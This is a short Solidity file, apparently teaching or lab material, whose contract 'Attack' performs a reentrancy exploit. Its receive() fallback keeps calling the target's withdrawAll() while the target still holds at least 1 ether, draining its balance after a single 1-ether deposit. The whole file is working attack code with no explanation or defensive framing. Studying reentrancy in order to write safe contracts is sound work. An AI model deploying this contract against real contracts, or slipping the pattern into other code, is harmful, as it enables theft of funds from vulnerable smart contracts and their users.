// SPDX-License--Identifier: MIT

pragma solidity ^0.8.9;

interface ITarget {
    function deposit() external payable;
    function withdrawAll() external;
}

contract Attack {
    ITarget public immutable target;

    constructor(ITarget _target) {
        target = _target;
    }
    
    receive() external payable {
        if (address(target).balance >= 1 * 10 ** 18) {
            target.withdrawAll();
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Cam to attack");
        target.deposit{value: 1 ether}();
        target.withdrawAll();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}